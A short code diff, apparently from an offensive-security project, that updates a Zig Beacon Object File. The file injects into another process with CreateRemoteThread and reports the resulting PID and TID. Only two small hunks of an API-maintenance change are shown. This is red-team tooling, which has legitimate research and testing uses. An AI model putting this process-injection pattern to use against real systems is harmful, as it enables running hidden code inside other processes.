@@ -47,8 +47,6 @@ comptime {
 pub const panic = std.debug.no_panic;
 
 pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
-    @import("bof_api").init(adata, alen, .{});
-
     var parser = beacon.datap{};
     beacon.dataParse(&parser, adata, alen);
 
@@ -169,7 +167,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     const thread_handle = w32.CreateRemoteThread(process, null, 0, @ptrCast(addr), null, 0, null) orelse return 0xff;
     defer _ = w32.CloseHandle(thread_handle);
 
-    _ = beacon.printf(.output, "BOF runs in PID: %d, TID: %d\n", w32.GetProcessId(process), w32.GetThreadId(thread_handle));
+    _ = beacon.printf(.output, "BOF runs in PID: %d, TID: %d\n", .{ w32.GetProcessId(process), w32.GetThreadId(thread_handle) });
 
     return 0;
 }
